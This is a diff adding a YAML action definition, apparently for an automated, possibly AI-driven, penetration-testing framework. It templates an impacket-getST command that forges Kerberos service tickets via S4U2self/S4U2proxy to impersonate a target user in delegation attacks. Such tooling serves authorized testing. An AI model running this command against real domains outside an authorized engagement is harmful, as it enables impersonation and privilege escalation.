@@ -1,0 +1,17 @@
+name: getst
+category: ad
+description: Request service ticket via S4U2self/S4U2proxy
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-getST '{domain}/{username}:{password}' -spn '{spn}' -impersonate {target_user} -dc-ip {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "S4U2self gets service ticket to self, S4U2proxy forwards to target SPN. Used in delegation attacks (constrained/RBCD)."
